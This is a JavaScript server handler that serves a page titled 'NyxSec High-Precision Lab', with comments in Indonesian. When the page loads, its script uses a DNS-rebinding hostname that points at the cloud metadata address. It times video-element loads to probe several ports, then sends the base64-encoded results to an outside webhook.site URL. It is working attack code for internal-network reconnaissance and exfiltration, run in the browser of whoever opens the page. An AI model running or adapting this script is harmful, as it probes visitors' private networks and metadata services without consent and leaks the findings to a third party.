export default function handler(req, res) {
  res.setHeader('Content-Type', 'text/html');
  res.status(200).send(`
    <html>
      <head><title>NyxSec High-Precision Lab</title></head>
      <body>
        <pre>Status: Executing Comprehensive Media-Stream Probing...</pre>
        <script>
          const webhook = "https://webhook.site/0a66617e-3159-4804-9229-84d7010ec66d";
          const rebindBase = "01010101.a9fea9fe.rbndr.us";

          async function mediaProbe(port) {
            const start = Date.now();
            return new Promise((resolve) => {
              const video = document.createElement('video');
              
              // Timeout 5 detik: Batas krusial untuk membedakan Drop vs Reject
              const timer = setTimeout(() => {
                video.src = ""; // Stop loading
                resolve({ port, time: Date.now() - start, status: "timeout" });
              }, 5000);

              video.onprogress = video.onsuspend = () => {
                clearTimeout(timer);
                resolve({ port, time: Date.now() - start, status: "interaction_detected" });
              };

              video.onerror = () => {
                clearTimeout(timer);
                resolve({ port, time: Date.now() - start, status: "error" });
              };

              // Cache-busting unik untuk setiap port
              video.src = "http://" + rebindBase + ":" + port + "/stream?v=" + Math.random();
              video.load();
            });
          }

          async function runProtocol() {
            const results = [];
            // Daftar port untuk validasi silang:
            // 9000, 9090: Port anomali sebelumnya
            // 80: Port standar (Baseline 1)
            // 12345, 54321, 65535: Port "pasti mati" (Baseline 2)
            const targetPorts = [9000, 9090, 80, 12345, 54321, 65535];

            for (const p of targetPorts) {
              results.push(await mediaProbe(p));
            }

            fetch(webhook + "?final_validation=" + btoa(JSON.stringify(results)));
          }

          runProtocol();
        </script>
      </body>
    </html>
  `);
}
